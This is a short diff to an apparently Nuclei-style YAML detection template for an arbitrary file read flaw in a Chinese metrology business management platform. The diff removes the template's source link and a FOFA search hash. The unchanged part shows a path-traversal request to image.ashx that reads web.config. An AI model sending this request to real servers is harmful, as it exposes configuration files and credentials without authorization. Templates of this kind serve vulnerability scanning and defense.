@@ -3,12 +3,8 @@ info:
   name: 卓软计量业务管理平台 image.ashx 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tgeo9qxlwhx21mz7'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tgeo9qxlwhx21mz7
-    fofa: icon_hash="-334571363"
 http:
 - raw:
   - 'GET /HuameiMeasure/image.ashx?image_path=./../web.config HTTP/1.1
